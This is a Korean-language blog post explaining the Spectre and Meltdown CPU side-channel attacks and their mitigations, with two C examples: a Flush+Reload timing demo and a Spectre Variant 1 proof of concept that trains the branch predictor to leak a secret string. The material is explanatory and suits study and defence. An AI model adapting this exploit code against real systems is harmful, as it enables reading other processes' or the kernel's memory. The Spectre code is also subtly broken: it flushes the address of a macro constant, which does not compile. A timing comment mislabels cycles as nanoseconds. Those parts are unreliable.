---
layout: post
title: "Spectre와 Meltdown 완전 정복: 투기적 실행이 만들어낸 CPU 사이드 채널 공격의 원리와 대응"
date: 2026-08-09
categories: [cs, computer-science]
tags: [spectre, meltdown, side-channel-attack, cpu, speculative-execution, security, hardware-vulnerability]
---

## Spectre와 Meltdown이란 무엇인가

2018년 1월, 보안 연구자들은 Intel·AMD·ARM 등 사실상 모든 현대 CPU에 영향을 미치는 치명적인 취약점 두 가지를 공개했다. 바로 **Spectre(CVE-2017-5753, CVE-2017-5715)**와 **Meltdown(CVE-2017-5754)**이다.

이 취약점들은 소프트웨어 버그가 아니라 **CPU 하드웨어의 성능 최적화 메커니즘 자체**에서 비롯되었다. 공격자는 이를 이용해 커널 메모리, 다른 프로세스의 메모리, 심지어 하이퍼바이저(가상화 레이어)의 메모리까지 읽어낼 수 있다.

이 취약점들은 **사이드 채널 공격(Side-Channel Attack)**의 일종이다. 사이드 채널 공격은 시스템의 의도된 인터페이스가 아니라, **CPU 캐시 타이밍, 전력 소비, 전자기 방사** 같은 부수적인 신호를 관찰해 비밀 정보를 추출하는 공격 방식이다.

---

## 왜 이 취약점이 존재하는가: 투기적 실행

현대 CPU는 성능을 극대화하기 위해 **투기적 실행(Speculative Execution)**을 사용한다. 프로그램을 순차적으로 실행하지 않고, 분기(if문, 함수 호출)의 결과를 예측하여 **미리 다음 명령어들을 실행**해두는 기법이다.

```
if (x < array_size) {
    // CPU는 x < array_size가 참인지 확인하기 전에
    // 이 블록을 미리 실행할 수 있다!
    value = array[x];
}
```

분기 예측이 맞으면 미리 실행한 결과를 그대로 사용해 속도 이득을 얻는다. 예측이 틀리면 CPU는 실행을 **롤백(rollback)**하고 정확한 경로로 재실행한다. 롤백 시 레지스터 값과 메모리 쓰기는 취소되지만, **CPU 캐시의 상태는 취소되지 않는다**. 이것이 바로 문제의 핵심이다.

### 투기적 실행의 파이프라인 구조

```
[명령어 패치] → [디코드] → [실행(투기적)] → [커밋/롤백]
                                 ↑
                       분기 예측 결과가 맞으면 커밋
                       틀리면 레지스터 롤백 (캐시는 그대로!)
```

---

## Meltdown: 커널 메모리를 읽는 법

Meltdown은 **비순서 실행(Out-of-Order Execution)**과 캐시를 결합한 공격이다. 일반 사용자 프로세스는 커널 메모리에 접근하면 보호 결함(segfault)이 발생한다. 그러나 투기적 실행 중에는 권한 검사 전에 잠깐이나마 커널 메모리 값이 CPU 파이프라인 안에 존재한다.

### 공격 원리 (Flush+Reload)

1. 공격자가 준비한 256개 엔트리 배열을 캐시에서 플러시(flush)한다.
2. 권한 검사를 우회하는 투기적 접근으로 커널 메모리의 비밀 바이트 `secret`을 읽는다.
3. 투기적으로 `probe_array[secret * PAGE_SIZE]`를 메모리에 접근한다 (캐시에 로드됨).
4. CPU가 권한 오류를 감지하고 롤백한다 (캐시 상태는 유지!).
5. 256개 배열 엔트리에 대해 접근 시간을 측정한다. **빠른 접근 = 캐시 히트 = 해당 인덱스가 `secret` 값**.

### 예제 1: Meltdown/Spectre 유형의 Flush+Reload 캐시 타이밍 측정 (C)

```c
#include <stdint.h>
#include <string.h>
#include <stdio.h>
#include <x86intrin.h>

#define PAGE_SIZE 4096
#define NUM_PROBES 256

// 캐시 타이밍 측정용 프로브 배열 (각 프로브는 별도 캐시 라인에 위치)
static uint8_t probe_array[NUM_PROBES * PAGE_SIZE];

// 지정된 주소를 캐시에서 플러시
void flush_probe_array() {
    for (int i = 0; i < NUM_PROBES; i++) {
        _mm_clflush(&probe_array[i * PAGE_SIZE]);
    }
}

// 특정 메모리 주소에 접근하는 데 걸리는 시간 측정 (나노초 단위 근사)
uint64_t measure_access_time(void *addr) {
    uint64_t t1, t2;
    volatile uint8_t dummy;

    _mm_mfence();
    t1 = __rdtsc();
    dummy = *(volatile uint8_t *)addr;
    _mm_mfence();
    t2 = __rdtsc();

    return t2 - t1;
}

// 프로브 배열에서 캐시에 로드된 인덱스 찾기 (비밀 값 복구)
int recover_secret_byte() {
    uint64_t times[NUM_PROBES];
    int min_idx = 0;
    uint64_t min_time = UINT64_MAX;

    for (int i = 0; i < NUM_PROBES; i++) {
        // 랜덤 순서로 접근해야 프리패치 방해 (여기서는 단순화)
        times[i] = measure_access_time(&probe_array[i * PAGE_SIZE]);
    }

    for (int i = 0; i < NUM_PROBES; i++) {
        if (times[i] < min_time) {
            min_time = times[i];
            min_idx = i;
        }
    }

    // 캐시 히트 임계값: 보통 80~100 사이클 이하면 캐시 히트
    printf("Fastest access: index=%d, cycles=%lu\n", min_idx, min_time);
    return (min_time < 100) ? min_idx : -1; // -1: 불확실
}

int main() {
    // 프로브 배열 초기화 (최적화 방지)
    memset(probe_array, 0, sizeof(probe_array));

    printf("=== Flush+Reload 캐시 타이밍 데모 ===\n");

    // 1단계: 모든 프로브를 캐시에서 플러시
    flush_probe_array();

    // 2단계: 특정 인덱스(예: 42번)를 캐시에 로드
    volatile uint8_t dummy = probe_array[42 * PAGE_SIZE];
    (void)dummy;

    // 3단계: 캐시 히트로 비밀 값 복구
    int secret = recover_secret_byte();
    printf("복구된 비밀 바이트: %d (실제 값: 42)\n", secret);

    return 0;
}
```

이 예제는 Flush+Reload 기법의 핵심 원리를 보여준다. 실제 Meltdown 공격은 투기적 실행 도중 커널 메모리의 바이트를 probe_array 인덱스로 사용해 캐시에 흔적을 남기는 방식이다.

---

## Spectre: 분기 예측기를 속이는 법

Spectre는 Meltdown보다 교묘하다. 공격자는 CPU의 **분기 예측기(Branch Predictor)**를 의도적으로 훈련(mis-train)시켜, 피해자 프로세스(또는 같은 프로세스의 다른 코드)가 경계를 넘어 잘못된 메모리를 투기적으로 접근하도록 유도한다.

### Spectre Variant 1 (Bounds Check Bypass)

```c
// 피해자 코드 (예: 커널 함수나 JIT 컴파일된 코드)
if (x < array1_size) {           // 경계 검사
    value = array1[x];           // 투기적으로 여기까지 실행됨
    dummy = array2[value * 512]; // 이 접근이 캐시에 흔적을 남김
}
```

공격자는 정상 범위의 x 값으로 반복 호출해 `x < array1_size`가 참이 되도록 분기 예측기를 훈련시킨다. 그런 다음 경계를 벗어난 x 값(악의적인 오프셋)으로 호출하면, 분기 예측기가 여전히 "참"으로 예측해 투기적으로 `array1[x]`(민감한 메모리)에 접근하고 그 값을 `array2`의 인덱스로 사용한다.

### 예제 2: Spectre Variant 1 개념 증명 (C)

```c
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <x86intrin.h>

#define ARRAY_SIZE 16
#define SECRET_SIZE 64
#define NUM_PROBES 256
#define PAGE_SIZE 4096

// 피해자의 데이터
uint8_t array1[ARRAY_SIZE] = {1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16};
uint8_t array2[NUM_PROBES * PAGE_SIZE];
uint8_t temp = 0; // 최적화 방지용

// 피해자가 노출하면 안 되는 비밀 데이터
char secret[] = "SUPERSECRETPASSWORD";

// 경계 검사가 있어 보이는 함수 (하지만 Spectre에 취약!)
void victim_function(size_t x) {
    if (x < ARRAY_SIZE) {
        // 분기 예측기가 항상 참으로 예측하도록 훈련된 후
        // x가 범위를 벗어나면 array1[x]가 비밀 메모리를 가리킬 수 있음
        temp &= array2[array1[x] * PAGE_SIZE];
    }
}

// 분기 예측기 훈련: 정상 범위로 반복 호출
void train_branch_predictor(size_t legit_x) {
    for (int i = 0; i < 100; i++) {
        victim_function(legit_x % ARRAY_SIZE);
    }
}

// 비밀 바이트 추출 (개념 증명 — 실제 공격에서는 캐시 타이밍으로 복구)
int spectre_read(size_t malicious_x) {
    // 1. 프로브 배열 캐시 플러시
    for (int i = 0; i < NUM_PROBES; i++) {
        _mm_clflush(&array2[i * PAGE_SIZE]);
    }

    // 2. 분기 예측기 훈련
    train_branch_predictor(1);

    // 3. array1_size를 캐시에서 플러시 (경계 검사를 느리게)
    _mm_clflush(&ARRAY_SIZE);
    _mm_mfence();

    // 4. 악의적인 x로 호출 (분기 예측기는 여전히 참으로 예측)
    victim_function(malicious_x);

    // 5. 캐시 타이밍으로 어떤 array2 엔트리가 로드됐는지 확인
    uint64_t min_time = UINT64_MAX;
    int guessed_byte = -1;

    for (int i = 0; i < NUM_PROBES; i++) {
        uint64_t t1 = __rdtsc();
        volatile uint8_t v = array2[i * PAGE_SIZE];
        (void)v;
        uint64_t t2 = __rdtsc();

        if (t2 - t1 < min_time) {
            min_time = t2 - t1;
            guessed_byte = i;
        }
    }

    return (min_time < 100) ? guessed_byte : -1;
}

int main() {
    printf("=== Spectre Variant 1 개념 증명 ===\n");
    printf("비밀 문자열 주소: %p\n", (void*)secret);
    printf("array1 주소: %p\n", (void*)array1);

    // 악의적인 오프셋: array1에서 secret 위치까지의 거리
    size_t malicious_x = (size_t)(secret - (char*)array1);
    printf("악의적인 오프셋: %zu\n", malicious_x);

    // 비밀의 첫 번째 바이트 읽기 시도
    int leaked_byte = spectre_read(malicious_x);
    printf("추측된 비밀 첫 바이트: %d ('%c')\n",
           leaked_byte, (leaked_byte >= 32 && leaked_byte < 127) ? leaked_byte : '?');
    printf("실제 비밀 첫 바이트: %d ('%c')\n", (uint8_t)secret[0], secret[0]);

    return 0;
}
```

이 코드는 교육 목적의 개념 증명이다. 실제 환경에서는 노이즈, 타이밍 정밀도, 시스템 엔트로피 때문에 수백 번 반복·평균을 내야 한다.

---

## 주요 변형들

| 이름 | CVE | 메커니즘 | 공격 대상 |
|------|-----|----------|-----------|
| Spectre Variant 1 | CVE-2017-5753 | 경계 검사 우회 | 같은 프로세스의 다른 주소 공간 |
| Spectre Variant 2 | CVE-2017-5715 | 간접 분기 예측기 오염 | 다른 프로세스, 커널 |
| Meltdown | CVE-2017-5754 | 비순서 실행 + 권한 검사 우회 | 커널 전체 메모리 |
| SpectreRSB | - | 반환 스택 버퍼 오염 | 함수 반환 후 실행 흐름 |
| Foreshadow (L1TF) | CVE-2018-3615 | L1 캐시를 통한 SGX 데이터 추출 | Intel SGX 엔클레이브 |

---

## 대응 방안 및 완화 기법

### 1. KPTI (Kernel Page-Table Isolation)

Meltdown의 핵심 완화책. 커널 페이지 테이블과 사용자 페이지 테이블을 완전히 분리해, 사용자 모드에서 커널 메모리가 아예 매핑되지 않도록 한다. Linux 4.15부터 기본 적용되었으며, Intel CPU에서 약 5~30%의 성능 저하를 일으킬 수 있다.

```
[KPTI 이전]
사용자 페이지 테이블: [사용자 메모리] + [커널 메모리 (권한=수퍼바이저)]

[KPTI 이후]
사용자 페이지 테이블: [사용자 메모리] + [최소한의 커널 진입점만]
커널 페이지 테이블: [커널 전체 메모리]
```

### 2. Retpoline (Return Trampoline)

Spectre Variant 2 완화책. 간접 분기(indirect branch)를 **반환 명령어(RET)** 기반의 무한 루프로 대체해 분기 예측기가 유용한 가젯(gadget)을 실행하지 못하게 한다. GCC/Clang에서 `-mindirect-branch=thunk` 플래그로 활성화할 수 있다.

### 3. IBRS/IBPB/STIBP (마이크로코드 업데이트)

- **IBRS (Indirect Branch Restricted Speculation)**: 커널 진입 시 투기적 분기 실행 제한
- **IBPB (Indirect Branch Predictor Barrier)**: 컨텍스트 스위치 시 분기 예측기 초기화
- **STIBP (Single Thread Indirect Branch Predictors)**: 하이퍼스레딩 환경에서 코어 간 분기 예측기 격리

### 4. CSE/SLH (Speculative Load Hardening)

컴파일러 레벨 완화책. 분기 조건에 의존하는 메모리 접근에 마스킹을 추가해, 투기적 실행 도중 잘못된 주소로의 접근을 차단한다. Clang에서 `-mspeculative-load-hardening`으로 활성화한다.

---

## 주의사항 및 팁

### 1. 완화책의 성능 영향

KPTI는 시스템 콜이 빈번한 워크로드(I/O 집약적 서버, 데이터베이스)에서 성능에 상당한 영향을 준다. 최신 Intel CPU(Tiger Lake 이후)는 하드웨어 레벨에서 EIBRS를 지원해 소프트웨어 완화책 없이도 Spectre Variant 2를 차단한다.

### 2. JavaScript 타이머 정밀도 제한

브라우저들은 Spectre 대응으로 `performance.now()`의 해상도를 1ms로 낮추고, `SharedArrayBuffer`의 기본 비활성화(나중에 COOP/COEP 헤더 조건부 재활성화)로 고해상도 타이머를 제한했다.

### 3. 마이크로아키텍처 공격은 계속 진화한다

Spectre/Meltdown 이후에도 **MDS(Microarchitectural Data Sampling)**, **TAA(TSX Asynchronous Abort)**, **RIDL**, **Fallout** 등 유사한 공격이 계속 발견되었다. CPU 하드웨어 취약점은 소프트웨어 패치만으로 완전히 해결되지 않으며, 차세대 하드웨어 설계에서 근본적 해결이 이루어지고 있다.

---

## 참고 자료

- [Eugnis/spectre-attack — Spectre 취약점 C 구현 (CVE-2017-5753, CVE-2017-5715)](https://github.com/Eugnis/spectre-attack)
- [isec-tugraz/meltdown — Meltdown 개념 증명 5종 데모](https://github.com/isec-tugraz/meltdown)
